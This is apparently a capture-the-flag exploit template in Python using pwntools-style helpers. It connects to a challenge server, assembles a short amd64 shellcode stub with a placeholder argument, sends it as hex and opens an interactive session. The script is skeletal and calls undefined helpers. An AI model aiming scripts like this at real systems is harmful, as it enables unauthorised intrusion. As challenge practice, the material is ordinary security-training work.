#!/usr/bin/env python3.9
# -*- coding: utf-8 -*-
__MODE__ = 'PWN'
from rootkit import *
import os
import monkeyhex
import time

# Set up pwntools for the correct architecture
host = args.HOST or 'challs.xmas.htsp.ro'
port = int(args.PORT or 2008)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug(["./chall.py"] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process(["./chall.py"] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
io = start()
context.arch='amd64'
shellcode = asm("""
	mov rax, 0x0
	mov rdi, 0xdeadbeef
	syscall
""")

shellcode=shellcode.hex()
print("shellcode : " + shellcode)
re()
sl(shellcode)

io.interactive()
